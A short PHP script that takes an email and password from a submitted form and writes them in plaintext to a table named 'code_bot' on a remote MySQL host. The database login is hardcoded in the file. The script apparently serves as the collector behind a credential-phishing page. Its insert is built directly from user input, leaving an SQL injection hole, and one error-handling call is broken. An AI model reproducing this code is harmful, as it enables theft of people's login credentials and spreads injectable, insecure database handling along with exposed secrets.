<?php
$username = $_POST['email'];
$password = $_POST['pass'];

$host = "remotemysql.com";
$dbusername = "AcBax6bujh";
$dbpassword = "7vWxgtx6K9";
$dbname = "AcBax6bujh";

$conn =  new mysqli($host,$dbusername,$dbpassword,$dbname);

if (!$conn) {
    die("Connection failed: " . $conn->connect_error());
}
echo "Connected successfully";


$sql = "INSERT INTO code_bot(email,password) values('$username','$password')";
if ($conn->query($sql)==true)
{
echo "data done";
}
$conn->close();
?>
